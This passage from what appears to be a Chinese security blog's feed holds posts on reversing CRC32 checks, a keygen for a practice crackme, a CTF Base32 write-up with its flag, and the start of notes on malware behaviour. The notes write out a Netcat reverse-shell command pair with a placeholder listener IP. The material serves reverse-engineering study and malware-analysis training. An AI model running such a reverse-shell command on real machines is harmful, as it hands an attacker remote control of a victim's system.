34h   21B4F4B5 56B3C423 CFBA9599 B8BDA50F</span><br><span class="line">  38h   2802B89E 5F058808 C60CD9B2 B10BE924</span><br><span class="line">  3Ch   2F6F7C87 58684C11 C1611DAB B6662D3D</span><br><span class="line"></span><br><span class="line">  40h   76DC4190 01DB7106 98D220BC EFD5102A</span><br><span class="line">  44h   71B18589 06B6B51F 9FBFE4A5 E8B8D433</span><br><span class="line">  48h   7807C9A2 0F00F934 9609A88E E10E9818</span><br><span class="line">  4Ch   7F6A0DBB 086D3D2D 91646C97 E6635C01</span><br><span class="line"></span><br><span class="line">  50h   6B6B51F4 1C6C6162 856530D8 F262004E</span><br><span class="line">  54h   6C0695ED 1B01A57B 8208F4C1 F50FC457</span><br><span class="line">  58h   65B0D9C6 12B7E950 8BBEB8EA FCB9887C</span><br><span class="line">  5Ch   62DD1DDF 15DA2D49 8CD37CF3 FBD44C65</span><br><span class="line"></span><br><span class="line">  60h   4DB26158 3AB551CE A3BC0074 D4BB30E2</span><br><span class="line">  64h   4ADFA541 3DD895D7 A4D1C46D D3D6F4FB</span><br><span class="line">  68h   4369E96A 346ED9FC AD678846 DA60B8D0</span><br><span class="line">  6Ch   44042D73 33031DE5 AA0A4C5F DD0D7CC9</span><br><span class="line"></span><br><span class="line">  70h   5005713C 270241AA BE0B1010 C90C2086</span><br><span class="line">  74h   5768B525 206F85B3 B966D409 CE61E49F</span><br><span class="line">  78h   5EDEF90E 29D9C998 B0D09822 C7D7A8B4</span><br><span class="line">  7Ch   59B33D17 2EB40D81 B7BD5C3B C0BA6CAD</span><br><span class="line"></span><br><span class="line">  80h   EDB88320 9ABFB3B6 03B6E20C 74B1D29A</span><br><span class="line">  84h   EAD54739 9DD277AF 04DB2615 73DC1683</span><br><span class="line">  88h   E3630B12 94643B84 0D6D6A3E 7A6A5AA8</span><br><span class="line">  8Ch   E40ECF0B 9309FF9D 0A00AE27 7D079EB1</span><br><span class="line"></span><br><span class="line">  90h   F00F9344 8708A3D2 1E01F268 6906C2FE</span><br><span class="line">  94h   F762575D 806567CB 196C3671 6E6B06E7</span><br><span class="line">  98h   FED41B76 89D32BE0 10DA7A5A 67DD4ACC</span><br><span class="line">  9Ch   F9B9DF6F 8EBEEFF9 17B7BE43 60B08ED5</span><br><span class="line"></span><br><span class="line">  A0h   D6D6A3E8 A1D1937E 38D8C2C4 4FDFF252</span><br><span class="line">  A4h   D1BB67F1 A6BC5767 3FB506DD 48B2364B</span><br><span class="line">  A8h   D80D2BDA AF0A1B4C 36034AF6 41047A60</span><br><span class="line">  ACh   DF60EFC3 A867DF55 316E8EEF 4669BE79</span><br><span class="line"></span><br><span class="line">  B0h   CB61B38C BC66831A 256FD2A0 5268E236</span><br><span class="line">  B4h   CC0C7795 BB0B4703 220216B9 5505262F</span><br><span class="line">  B8h   C5BA3BBE B2BD0B28 2BB45A92 5CB36A04</span><br><span class="line">  BCh   C2D7FFA7 B5D0CF31 2CD99E8B 5BDEAE1D</span><br><span class="line"></span><br><span class="line">  C0h   9B64C2B0 EC63F226 756AA39C 026D930A</span><br><span class="line">  C4h   9C0906A9 EB0E363F 72076785 05005713</span><br><span class="line">  C8h   95BF4A82 E2B87A14 7BB12BAE 0CB61B38</span><br><span class="line">  CCh   92D28E9B E5D5BE0D 7CDCEFB7 0BDBDF21</span><br><span class="line"></span><br><span class="line">  D0h   86D3D2D4 F1D4E242 68DDB3F8 1FDA836E</span><br><span class="line">  D4h   81BE16CD F6B9265B 6FB077E1 18B74777</span><br><span class="line">  D8h   88085AE6 FF0F6A70 66063BCA 11010B5C</span><br><span class="line">  DCh   8F659EFF F862AE69 616BFFD3 166CCF45</span><br><span class="line"></span><br><span class="line">  E0h   A00AE278 D70DD2EE 4E048354 3903B3C2</span><br><span class="line">  E4h   A7672661 D06016F7 4969474D 3E6E77DB</span><br><span class="line">  E8h   AED16A4A D9D65ADC 40DF0B66 37D83BF0</span><br><span class="line">  ECh   A9BCAE53 DEBB9EC5 47B2CF7F 30B5FFE9</span><br><span class="line"></span><br><span class="line">  F0h   BDBDF21C CABAC28A 53B39330 24B4A3A6</span><br><span class="line">  F4h   BAD03605 CDD70693 54DE5729 23D967BF</span><br><span class="line">  F8h   B3667A2E C4614AB8 5D681B02 2A6F2B94</span><br><span class="line">  FCh   B40BBE37 C30C8EA1 5A05DF1B 2D02EF8D</span><br></pre></td></tr></table></figure><h2 id="CRC32逆向实例分析"><a href="#CRC32逆向实例分析" class="headerlink" title="CRC32逆向实例分析"></a>CRC32逆向实例分析</h2><p><img src="https://i.loli.net/2018/08/16/5b758eff9d88b.jpg" alt=""></p><p>要求输入name和code，拖入IDA查看<br>查找字符串，来到算法位置</p><p><img src="https://i.loli.net/2018/08/16/5b758fe0ba199.jpg" alt=""></p><p>name存放到v3，code存放到v8<br>首先要求name字符数大于等于5<br>sub_402F1C将DiKeN附加到输入的name前</p><p><img src="https://i.loli.net/2018/08/16/5b75955a6c465.jpg" alt=""></p><p>sub_402ED0计算拼接后字符串长度<br>sub_403DF0是CRC32计算部分</p><p><img src="https://i.loli.net/2018/08/16/5b759975b94c4.jpg" alt=""></p><p>table如下</p><p><img src="https://i.loli.net/2018/08/16/5b759a7bb849d.jpg" alt=""></p><p>可以看到与CRC32相同，由此确定为CRC32加密</p><p>code部分则是将字符0加到code前，然后将其每个字符-30h，转换为数字，最后name与code异或校验。<br>这里着重谈逆向时的要点，具体分析请参考这篇文章 <a href="https://bbs.ichunqiu.com/thread-30717-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-30717-1-1.html</a></p><h2 id="魔改CRC分析方法"><a href="#魔改CRC分析方法" class="headerlink" title="魔改CRC分析方法"></a>魔改CRC分析方法</h2><p>首先还是要对标准CRC算法有一些了解。<br>能够修改的部分其实很少，感觉一般会修改生成多项式或修改数据表</p><ol><li><p>对于修改生成多项式，我们需要自己生成数据表，参照脚本如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int make_crc32_table()  </span><br><span class="line">&#123;  </span><br><span class="line">    unsigned c;  </span><br><span class="line">    int i = 0;  </span><br><span class="line">    int bit = 0;  </span><br><span class="line">    for(i = 0; i &lt; 256; i++)  </span><br><span class="line">    &#123;  </span><br><span class="line">        c  = (unsigned)i;      </span><br><span class="line">        for(bit = 0; bit &lt; 8; bit++)  </span><br><span class="line">        &#123;  </span><br><span class="line">            if(c&amp;1)  </span><br><span class="line">            &#123;  </span><br><span class="line">                c = (c &gt;&gt; 1)^(0xEDB88320);  //生成多项式自行修改</span><br><span class="line">                 </span><br><span class="line">            &#125;  </span><br><span class="line">            else </span><br><span class="line">            &#123;  </span><br><span class="line">                c =  c &gt;&gt; 1;  </span><br><span class="line">            &#125;     </span><br><span class="line">        &#125;  </span><br><span class="line">        crc32_table = c; </span><br><span class="line">    &#125;        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>对于修改数据表，应该只能通过与常用表进行对照了</p></li></ol><h2 id="CRC32发送端接收端完整校验验证性程序"><a href="#CRC32发送端接收端完整校验验证性程序" class="headerlink" title="CRC32发送端接收端完整校验验证性程序"></a>CRC32发送端接收端完整校验验证性程序</h2><p>发送端发送数据后显示CRC32加密密文，接收端解码返回0证明校验成功</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line">#define POLY 0x04C11DB7L // CRC32生成多项式  </span><br><span class="line"></span><br><span class="line">unsigned int CRC32INV(char * data, int length) //接收端</span><br><span class="line">&#123;</span><br><span class="line">        unsigned char* p = new unsigned char[length];</span><br><span class="line">        memcpy(p, data, length);</span><br><span class="line">        unsigned int reg = 0, sum_poly = 0;</span><br><span class="line">        for (int i = 0; i &lt; length; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                sum_poly = reg &amp; 0xFF000000;</span><br><span class="line">                for (int j = 0; j &lt; 8; j++)</span><br><span class="line">                &#123;</span><br><span class="line">                        int hi = sum_poly &amp; 0x80000000;</span><br><span class="line">                        sum_poly &lt;&lt;= 1;</span><br><span class="line">                        if (hi) sum_poly = sum_poly ^ POLY;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                reg = (reg &lt;&lt; 8) | p[i];</span><br><span class="line">                reg = reg ^ sum_poly;</span><br><span class="line">        &#125;</span><br><span class="line">        return reg;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsigned int CRC32(char * data, int length) //发送端</span><br><span class="line">&#123;</span><br><span class="line">        unsigned char* p = new unsigned char[length + 4];</span><br><span class="line">        memset(p, 0, length + 4);</span><br><span class="line">        memcpy(p, data, length);</span><br><span class="line">        unsigned int reg = 0, sum_poly = 0;</span><br><span class="line">        for (int i = 0; i &lt; length + 4; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                sum_poly = reg &amp; 0xFF000000;</span><br><span class="line">                for (int j = 0; j &lt; 8; j++)</span><br><span class="line">                &#123;</span><br><span class="line">                        int hi = sum_poly &amp; 0x80000000;</span><br><span class="line">                        sum_poly &lt;&lt;= 1;</span><br><span class="line">                        if (hi) sum_poly = sum_poly ^ POLY;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                reg = (reg &lt;&lt; 8) | p[i];</span><br><span class="line">                reg = reg ^ sum_poly;</span><br><span class="line">        &#125;</span><br><span class="line">        return reg;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">        char *crcin = new char[5];</span><br><span class="line">        crcin[0] = &apos;1&apos;;</span><br><span class="line">        crcin[1] = &apos;2&apos;;</span><br><span class="line">        crcin[2] = &apos;3&apos;;</span><br><span class="line">        crcin[3] = &apos;4&apos;;</span><br><span class="line">        crcin[4] = &apos;\0&apos;;</span><br><span class="line">        unsigned int crcout = CRC32(crcin, 4);</span><br><span class="line">        char *crcinvin = new char[9];</span><br><span class="line">        memcpy(crcinvin, crcin, 4);</span><br><span class="line">        delete[] crcin;</span><br><span class="line">        for (int i = 0; i&lt;4; i++)</span><br><span class="line">                memcpy(crcinvin + i + 4, (char*)&amp;crcout + 3 - i, 1);</span><br><span class="line">        crcinvin[8] = &apos;\0&apos;;</span><br><span class="line">        unsigned int crcinvout = CRC32INV(crcinvin, 8);</span><br><span class="line">        cout &lt;&lt; &quot;crc&quot; &lt;&lt; crcout &lt;&lt; endl;</span><br><span class="line">        cout &lt;&lt; &quot;crc&quot; &lt;&lt; crcinvout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">        getchar();</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/08/17/5b767581d0468.png" alt=""></p><hr><p>目前想到的就先这些<br>参考链接：<br><a href="https://www.cnblogs.com/dacainiao/p/5565046.html" target="_blank" rel="noopener">https://www.cnblogs.com/dacainiao/p/5565046.html</a><br><a href="http://wdhdmx.iteye.com/blog/1464269" target="_blank" rel="noopener">http://wdhdmx.iteye.com/blog/1464269</a><br><a href="https://blog.csdn.net/qq446252221/article/details/51426434" target="_blank" rel="noopener">https://blog.csdn.net/qq446252221/article/details/51426434</a><br><a href="https://blog.csdn.net/wave_1102/article/details/2184901" target="_blank" rel="noopener">https://blog.csdn.net/wave_1102/article/details/2184901</a><br><a href="https://bbs.ichunqiu.com/thread-30717-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-30717-1-1.html</a><br><a href="https://blog.csdn.net/android_lover2014/article/details/78260884" target="_blank" rel="noopener">https://blog.csdn.net/android_lover2014/article/details/78260884</a><br><a href="https://bbs.pediy.com/thread-30975.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-30975.htm</a><br><a href="https://blog.csdn.net/sparkliang/article/details/5671510" target="_blank" rel="noopener">https://blog.csdn.net/sparkliang/article/details/5671510</a></p><p>End。。</p><p>From <a href="https://kabeor.github.io/CRC校验算法及逆向方法初探/">https://kabeor.github.io/CRC校验算法及逆向方法初探/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CRC校验算法及逆向方法初探&quot;&gt;&lt;a href=&quot;#CRC校验算法及逆向方法初探&quot; class=&quot;headerlink&quot; title=&quot;CRC校验算法及逆向方法初探&quot;&gt;&lt;/a&gt;CRC校验算法及逆向方法初探&lt;/h1&gt;&lt;h2 id=&quot;循环冗余校验（Cyclic-red
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向，CRC加密" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91%EF%BC%8CCRC%E5%8A%A0%E5%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>001_Acid_burn.exe 算法分析</title>
    <link href="https://kabeor.github.io/001_Acid_burn.exe%20%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/"/>
    <id>https://kabeor.github.io/001_Acid_burn.exe 算法分析/</id>
    <published>2018-08-03T03:55:16.879Z</published>
    <updated>2018-08-03T03:57:03.654Z</updated>
    
    <content type="html"><![CDATA[<h1 id="001-Acid-burn-exe-算法分析"><a href="#001-Acid-burn-exe-算法分析" class="headerlink" title="001_Acid_burn.exe 算法分析"></a>001_Acid_burn.exe 算法分析</h1><p>爆破的方法是好几个月以前写的了<br><a href="https://kabeor.cn/001_Acid_burn.exe/" target="_blank" rel="noopener">001_Acid_burn.exe</a></p><p>今天来看一下算法</p><h2 id="Serial"><a href="#Serial" class="headerlink" title="Serial"></a>Serial</h2><p>直接在OD中分析此分支，找到跳转判断条件<br><img src="https://i.loli.net/2018/08/03/5b63ce2dba2af.jpg" alt=""></p><p>函数004039FC内将输入字符串与“Hello Dude!”进行比较<br>即密码就是 Hello Dude!</p><h2 id="Name-Serial"><a href="#Name-Serial" class="headerlink" title="Name+Serial"></a>Name+Serial</h2><p><img src="https://i.loli.net/2018/08/03/5b63cfafaf959.jpg" alt=""></p><p>整个结构很清晰，name长度必须大于等于4，然后进入算法判断</p><p><img src="https://i.loli.net/2018/08/03/5b63d010b8bc7.jpg" alt=""></p><p><img src="https://i.loli.net/2018/08/03/5b63d04f4f6a7.jpg" alt=""></p><p>如图注释<br>首先注意dword_431750被赋值为<strong>0x29</strong><br>然后直接看第二层验证<br>*v18是输入name的第一个字符name[0]</p><p>经过如下计算<br><code>name[0]*0x29*2</code><br>并将其转换为十进制，然后填入( )中组合成密码</p><pre><code>CW-( )-CRACKED</code></pre><h2 id="注册机"><a href="#注册机" class="headerlink" title="注册机"></a>注册机</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char name[1024];</span><br><span class="line"></span><br><span class="line">    printf(&quot;Input your name: &quot;);</span><br><span class="line">    scanf(&quot;%s&quot;, name);</span><br><span class="line">    printf(&quot;Serial: CW-%d-CRACKED\n&quot;, name[0] * 0x29 * 2);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>END..</p><p>From <a href="https://kabeor.github.io/001_Acid_burn.exe 算法分析/">https://kabeor.github.io/001_Acid_burn.exe 算法分析/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;001-Acid-burn-exe-算法分析&quot;&gt;&lt;a href=&quot;#001-Acid-burn-exe-算法分析&quot; class=&quot;headerlink&quot; title=&quot;001_Acid_burn.exe 算法分析&quot;&gt;&lt;/a&gt;001_Acid_burn.exe 算法
      
    
    </summary>
    
    
      <category term="逆向，160个crackme" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91%EF%BC%8C160%E4%B8%AAcrackme/"/>
    
  </entry>
  
  <entry>
    <title>2018巅峰极客网络安全技能挑战赛 RE(1) Simple Base-N</title>
    <link href="https://kabeor.github.io/2018%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%20RE(1)%20Simple%20Base-N/"/>
    <id>https://kabeor.github.io/2018巅峰极客网络安全技能挑战赛 RE(1) Simple Base-N/</id>
    <published>2018-07-24T02:20:15.634Z</published>
    <updated>2018-07-24T04:38:49.852Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2018巅峰极客网络安全技能挑战赛-RE-1-Simple-Base-N"><a href="#2018巅峰极客网络安全技能挑战赛-RE-1-Simple-Base-N" class="headerlink" title="2018巅峰极客网络安全技能挑战赛 RE(1) Simple Base-N"></a>2018巅峰极客网络安全技能挑战赛 RE(1) Simple Base-N</h1><p>通过这道题，又复习了一遍Base32的逆向<br><img src="https://i.loli.net/2018/07/24/5b568e0e2376c.png" alt="im"></p><p>很干净，无壳无花，x86 C++</p><p>拖进IDA</p><h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>搜索字符串<br><img src="https://i.loli.net/2018/07/24/5b568eef447cf.jpg" alt="enter description here"></p><p>定位，F5<br><img src="https://i.loli.net/2018/07/24/5b568f58c6d73.jpg" alt="im"><br><img src="https://i.loli.net/2018/07/24/5b568f94111d0.jpg" alt="im"></p><p>首先要求输入长度大于等于10</p><h3 id="1-Fake-Flag"><a href="#1-Fake-Flag" class="headerlink" title="1. Fake Flag"></a>1. Fake Flag</h3><p><code>v3 = &quot;guvf_vf_n_snxr_synt&quot;;</code>是用来骗人的，其操作是在sub_401100进行操作然后比较，因此只要利用逆向思维，将v3看作已知，对sub_401100进行逆操作即可</p><p>sub_401100内部为<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">signed int __thiscall sub_401100(const char *this)</span><br><span class="line">&#123;</span><br><span class="line">  const char *v1; // edi</span><br><span class="line">  unsigned int v2; // esi</span><br><span class="line">  char v3; // cl</span><br><span class="line"></span><br><span class="line">  v1 = this;</span><br><span class="line">  v2 = 0;</span><br><span class="line">  if ( strlen(this) )</span><br><span class="line">  &#123;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = v1[v2];</span><br><span class="line">      if ( (unsigned __int8)(v3 - 97) &lt;= 0x19u )</span><br><span class="line">        v1[v2] = (v3 - 84) % 26 + 97;</span><br><span class="line">      if ( (unsigned __int8)(v3 - 65) &lt;= 0x19u )</span><br><span class="line">        v1[v2] = (v3 - 52) % 26 + 65;</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( v2 &lt; strlen(v1) );</span><br><span class="line">  &#125;</span><br><span class="line">  return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看出是对ASCII操作<br>    84  -&gt; ‘T’<br>    97  -&gt; ‘a’<br>    52 -&gt; ‘4’<br>    65 -&gt; ‘A’</p><blockquote><p>脚本</p></blockquote><p><img src="https://i.loli.net/2018/07/24/5b569646a3664.jpg" alt="im"></p><p>当然了，这是假flag，仅供娱乐</p><h3 id="True-Flag"><a href="#True-Flag" class="headerlink" title="True Flag"></a>True Flag</h3><p>接着往下看<br><strong>LABEL_9</strong>才是真正的加解密函数</p><h4 id="编码表-sub-4012C0"><a href="#编码表-sub-4012C0" class="headerlink" title="编码表 sub_4012C0()"></a>编码表 sub_4012C0()</h4><p>进入<code>sub_4012C0();</code>查看<br><img src="https://i.loli.net/2018/07/24/5b56985dd2937.jpg" alt="enter description here"></p><p><code>sub_401100</code>刚刚分析过，这里仔细分析一下<br><img src="https://i.loli.net/2018/07/24/5b5699d86e2f5.jpg" alt="i"></p><p>接下来读取长度，<strong>+32</strong>是大写转换为小写操作<strong>，</strong>++i<strong> 及 </strong>i&amp;1**组合表示奇数位不变，偶数位转换</p><p><code>dword_40507C</code>内容需要括住按C键重新分析，将数据识别为Char类型，结果如下<br><img src="https://i.loli.net/2018/07/24/5b569c5e93812.jpg" alt="enter description here"></p><p>‘2765’及‘43’也是转换成char类型得到的，值得注意的是，未转换之前为十六进制编码，且应倒序读取，<code>dword_40507C</code>加上4位数字(即5672)就来到了<code>word_405080</code>,也就是数字顺序为<strong>567234</strong><br>或着在修复<code>dword_40507C</code>后，重新F5，即如下图，更加易于理解<br><img src="https://i.loli.net/2018/07/24/5b569ea6d5852.jpg" alt="enter description here"></p><p>于是将<strong>ABCDEFGHIJKLMNOPQRSTUVWXYZ</strong>带入脚本得出<br><img src="https://i.loli.net/2018/07/24/5b569f8908552.jpg" alt="enter description here"><br>再替换大小写，后面加567234即得出编码顺序<br><strong><em>NoPqRsTuVwXyZaBcDeFgHiJkLm567234</em></strong></p><h4 id="BASE32-sub-401310"><a href="#BASE32-sub-401310" class="headerlink" title="BASE32 sub_401310()"></a>BASE32 sub_401310()</h4><p>回到主函数，分析最后一个需要的函数<code>sub_401310()</code><br><img src="https://i.loli.net/2018/07/24/5b56a0f209578.jpg" alt="enter description here"></p><p>跟进<code>sub_401170</code><br><img src="https://i.loli.net/2018/07/24/5b56a1524a1c1.jpg" alt="enter description here"><br><img src="https://i.loli.net/2018/07/24/5b56a175578ae.jpg" alt="enter description here"></p><p>下面case里的数据识别为char为”=”,结合题目叫Simple Base-N可以猜到应该是Base16/32/64类型的加密，并且编码表的内容我们也刚刚已经得出，为了继续印证猜想，往上看看，发现如下操作<br><img src="https://i.loli.net/2018/07/24/5b56a26b97f72.jpg" alt="enter description here"></p><p>这看起来很眼熟，<img src="https://i.loli.net/2018/07/24/5b56a3075ac53.jpg" alt="enter description here"></p><p>之前写过一篇wp(<a href="https://kabeor.cn/2017%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9BNonstandard/" target="_blank" rel="noopener">2017第二届广东省强网杯线上赛Nonstandard</a>)，代码一模一样，看来就是Base32了。</p><h2 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h2><p>于是直接用上次的脚本就好,带入密码<code>weNTDk5LZsNRHk6cVogqTZmFy2NRP7X4ZHLTBZwg</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s = &quot;weNTDk5LZsNRHk6cVogqTZmFy2NRP7X4ZHLTBZwg&quot;</span><br><span class="line">table = &quot;NoPqRsTuVwXyZaBcDeFgHiJkLm567234&quot;</span><br><span class="line"></span><br><span class="line">def find(x):</span><br><span class="line">    if(x==&apos;=&apos;):</span><br><span class="line">        return 0</span><br><span class="line">    return table.index(x)</span><br><span class="line"></span><br><span class="line">for i in range(len(s)//8):</span><br><span class="line">    p = s[i*8:i*8+8]</span><br><span class="line">    t = 0</span><br><span class="line">    for j in p:</span><br><span class="line">        t = t&lt;&lt;5</span><br><span class="line">        t += find(j)</span><br><span class="line">    for j in range(5):</span><br><span class="line">        print(chr((t&amp;0xff00000000)&gt;&gt;32), end=&apos;&apos;)</span><br><span class="line">        t = t&lt;&lt;8</span><br></pre></td></tr></table></figure><h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><p><img src="https://i.loli.net/2018/07/24/5b56a42e4abd6.jpg" alt="enter description here"><br>得出之后提交并不正确，通过凯撒移位，发现Rot13的结果是flag<br><img src="https://i.loli.net/2018/07/24/5b56ad29a553f.jpg" alt="enter description here"></p><blockquote><p>flag：Y@u_Kn@W<em>b@s332</em>@Nd_r0t13</p></blockquote><hr><p>Get it！</p><p>From <a href="https://kabeor.github.io/2018巅峰极客网络安全技能挑战赛 RE(1">https://kabeor.github.io/2018巅峰极客网络安全技能挑战赛 RE(1) Simple Base-N/</a> Simple Base-N/) bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2018巅峰极客网络安全技能挑战赛-RE-1-Simple-Base-N&quot;&gt;&lt;a href=&quot;#2018巅峰极客网络安全技能挑战赛-RE-1-Simple-Base-N&quot; class=&quot;headerlink&quot; title=&quot;2018巅峰极客网络安全技能挑战赛 RE
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向，巅峰极客网络安全技能挑战赛，wp" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91%EF%BC%8C%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%EF%BC%8Cwp/"/>
    
  </entry>
  
  <entry>
    <title>第11章  恶意代码行为</title>
    <link href="https://kabeor.github.io/%E7%AC%AC11%E7%AB%A0%20%20%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E8%A1%8C%E4%B8%BA/"/>
    <id>https://kabeor.github.io/第11章  恶意代码行为/</id>
    <published>2018-07-23T02:39:10.596Z</published>
    <updated>2018-09-02T12:36:54.786Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第11章-恶意代码行为"><a href="#第11章-恶意代码行为" class="headerlink" title="第11章  恶意代码行为"></a>第11章  恶意代码行为</h1><h2 id="11x1-下载器和启动器"><a href="#11x1-下载器和启动器" class="headerlink" title="11x1 下载器和启动器"></a>11x1 下载器和启动器</h2><p>常见的两种恶意代码是下载器和启动器。下载器从互联网上下载其他的恶意代码，然后在本地系统中运行。下载器通常会与漏洞利用（exploit）打包在一起。下载器常用Windows API函数URLDownloadtoFileA和WinExec，来下载并运行新的恶意代码。</p><p>启动器（也称为加载器）是一类可执行文件，用来安装立即运行或者将来秘密执行的恶意代码。启动器通常包含一个它要加载的恶意代码。</p><h2 id="11x2-后门（backdoor）"><a href="#11x2-后门（backdoor）" class="headerlink" title="11x2 后门（backdoor）"></a>11x2 后门（backdoor）</h2><p>后门（backdoor）是另一种类型的恶意代码，它能让攻击者远程访问一个受害的机器。后门是一种最常见的恶意代码，它们拥有多种功能，并且以多种形式与大小存在。后门代码往往实现了全套功能，所以当使用一个后门时，攻击者通常不需要下载额外的恶意代码。</p><p>后门程序利用互联网的通信方式是多样的，但是一个常用的方法是利用80端口使用HTTP协议。<br>HTTP是出站流量最常使用的协议，所以它为恶意代码提供了一个与其他流量混淆的好机会。</p><p>后门拥有一套通用的功能，例如操作注册表、列举窗口、创建目录、搜索文件，等等。查看后门使用和导入的Windows函数，可以确定后门程序实现的功能。</p><h3 id="1-反向shell"><a href="#1-反向shell" class="headerlink" title="1. 反向shell"></a>1. 反向shell</h3><p>反向shell是从被感染机器上发起一个连接，它提供攻击者shell访问被感染机器的权限。反向shel或者作为一个单独的恶意代码存在，或者作为一个复杂后门程序中的组件而存在。在反向shell中，攻击者能够如同在本地系统上一样运行命令。</p><blockquote><p>Netcat反向shell</p></blockquote><p>可以通过在两台机器上运行Netcat，来创建一个反向shell。同时，攻击者已经知道在恶意代码中使用Netcat，或者和其他恶意程序一起打包使用。</p><p>Netcat被作为一个反向shell使用时，远程机器使用下列命令，等待入站连接。<br><code>nc -l -p 80</code><br>-1选项设置Netcat为监听模式，-p用来设置监听端口。接下来，受害机器向外连出，并且使用下列命令提供shell。<br><code>nc 1istener_ip 80 -e cmd.exe</code><br>Listener_ip 80是远程机器的IP地址和端口。-e选项用来指定连接建立后要运行的程序，并将这一程序标准输入和输出与套接字进行绑定。</p><blockquote><p>Windows反向shell</p></blockquote><p>使用cmd.exe作为Windows系统中的反向shell，有两种简单的恶意编码实现：基础方法和多线程技术。</p><p>基础方法在恶意代码编写者之间比较流行，因为它容易编写，且效果与多线程技术一致。它涉及CreateProcess函数的调用，并操纵传递给CreateProcess的STARTUPINFO结构。首先，创建一个套接字，并与远程服务器建立连接。然后，绑定这个套接字与cmd.exe标准流（标准输入、标准输出以及标准错误）。调用CreateProcess函数用隐藏窗口的方式创建cmd.exe程序，对受害者隐藏cmd.exe进程。</p><p>Windows反向shell的多线程版本涉及一个套接字、两个管道及两个线程的创建（查询API调用函数CreateThread、CreatePipe）。恶意代码有时将这种方法作为策略，来篡改或编码经过一个套接字传入或传出的数据。CreatePipe用来绑定一个管道的读写端，如标准输入（stdin）和标准输出（stdout）。CreateProcess方法用来绑定一个管道与标准流，而不是直接与套接字绑定。调用CreateProcess方法，恶意代码会产生两个线程：一个用来从标准输入管道读数据，并且向套接字写数据，另外一个用来从一个套接字读数据，并且向一个标准输出管道写数据。通常这两个线程使用数据编码来篡改数据。</p><h3 id="2-远程控制工具"><a href="#2-远程控制工具" class="headerlink" title="2. 远程控制工具"></a>2. 远程控制工具</h3><p>远程控制工具（RAT）被用来远程管理一台或多台计算机。远程控制工具经常为了特定目标，如窃取信息或者旁路一个网络执行针对性的攻击。</p><p>服务器端运行在一个被植入恶意代码的受害主机上。客户端作为攻击者远程操纵运行命令和控制的单元。服务器端命令客户端开始一个连接，同时它们也被客户端控制。远程控制工具通常通过如80、443等常用的端口通信。</p><blockquote><p>远程控制工具的网络结构<br><img src="https://i.loli.net/2018/07/23/5b55432e2760f.jpg" alt="i"></p><p>Poison lvy（ <a href="http://www.poisonivy-rat.com/" target="_blank" rel="noopener">http://www.poisonivy-rat.com/</a> ）（<a href="http://www.primalsecurity.net/poison-ivy-remote-access-tool-rat/" target="_blank" rel="noopener">http://www.primalsecurity.net/poison-ivy-remote-access-tool-rat/</a> ）是一个免费提供且流行的远程控制工具。它的功能由shellcode插件控制，这使得它具有良好的扩展性。Poison Ivy是一款有用的工具，它能够快速生成用来测试和分析的恶意样本。</p></blockquote><h3 id="3-僵尸网络"><a href="#3-僵尸网络" class="headerlink" title="3. 